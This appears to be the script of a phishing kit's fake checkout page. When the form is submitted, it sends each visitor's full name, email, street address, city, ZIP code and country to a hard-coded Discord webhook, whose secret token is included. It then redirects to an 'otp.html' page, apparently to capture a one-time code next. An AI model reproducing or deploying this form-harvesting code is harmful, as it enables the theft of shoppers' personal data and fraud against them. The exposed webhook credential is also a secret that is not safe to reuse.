document.getElementById('checkout-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the form from submitting the default way

    // Get form values
    const fullName = document.getElementById('full-name').value.trim();
    const email = document.getElementById('email').value.trim();
    const address = document.getElementById('address').value.trim();
    const city = document.getElementById('city').value.trim();
    const zip = document.getElementById('zip').value.trim();
    const country = document.getElementById('country').value.trim();

    // Check if all fields are filled
    if (!fullName || !email || !address || !city || !zip || !country) {
        alert('Please fill out all required fields.');
        return; // Stop the function if fields are not filled
    }

    // Prepare data to send to the webhook
    const payload = {
        content: `New Checkout Details:
        \nFull Name: ${fullName}
        \nEmail: ${email}
        \nAddress: ${address}
        \nCity: ${city}
        \nZIP Code: ${zip}
        \nCountry: ${country}`
    };

    // Send the data to the webhook
    fetch('https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            // Redirect to otp.html if the webhook request was successful
            window.location.href = 'otp.html';
        } else {
            alert('There was a problem with the checkout process. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('There was an error processing your request. Please try again.');
    });
});